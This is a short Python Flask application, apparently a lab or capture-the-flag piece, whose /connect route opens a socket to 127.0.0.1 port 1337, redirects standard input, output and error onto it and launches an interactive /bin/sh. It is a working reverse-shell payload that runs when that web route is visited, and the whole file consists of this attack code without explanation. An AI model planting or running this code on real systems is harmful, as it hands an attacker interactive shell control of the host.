#!/usr/bin/env python

import os
import socket
import subprocess

from flask import Flask

app = Flask(__name__)


@app.route("/")
def index():
    return "Hello hackers!"


@app.route("/connect")
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 1337))

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    subprocess.call(["/bin/sh", "-i"])

    return "Shell spawned!"


application = app
